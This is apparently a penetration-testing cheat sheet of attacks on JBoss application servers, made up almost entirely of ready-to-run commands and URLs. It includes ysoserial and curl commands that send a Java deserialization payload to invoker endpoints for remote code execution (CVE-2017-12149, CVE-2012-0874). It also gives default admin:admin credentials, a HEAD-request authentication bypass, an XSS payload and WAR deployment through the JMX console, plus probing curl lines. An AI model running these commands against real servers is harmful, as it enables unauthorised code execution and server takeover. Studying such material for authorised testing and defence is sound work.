# JBoss Attacks

## 1. CVE-2017-12149 — Deserialization RCE
```bash
# JBoss 4.x/5.x/6.x
curl -sk -X POST "http://target/invoker/readonly" -d @payload.ser
# ysoserial payload
java -jar ysoserial.jar CommonsCollections1 "id" > payload.ser
```

## 2. JMX Console
```
http://target/jmx-console/
http://target/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo
```

## 3. Web Console
```
http://target/web-console/
http://target/web-console/Invoker
```

## 4. Admin Console
```
http://target/admin-console/
# Default creds: admin:admin
```

## 5. JMX Invoker Servlet
```
http://target/invoker/JMXInvokerServlet
# Deserialize Java objects
```

## 6. EJBInvokerServlet
```
http://target/invoker/EJBInvokerServlet
# Deserialize Java objects
```

## 7. CVE-2010-0738 — Auth Bypass
```
HEAD /admin-console/ HTTP/1.1
# Bypasses authentication
```

## 8. CVE-2006-5750 — XSS
```
http://target/web-console/ServerInfo.jsp?script=<script>alert(1)</script>
```

## 9. WAR Deployment via JMX
```
# Deploy WAR through JMX Console
jboss.system:service=MainDeployer -> deploy(url)
```

## 10. CVE-2012-0874 — Deserialization
```bash
# JBossInvokerServlet deserialization
curl -sk "http://target/invoker/JMXInvokerServlet" -d @payload.ser
```

## Detection
```bash
curl -sk "http://target/jmx-console/"
curl -sk "http://target/web-console/"
curl -sk "http://target/admin-console/"
curl -sk "http://target/invoker/JMXInvokerServlet"
curl -sk "http://target/invoker/EJBInvokerServlet"
```
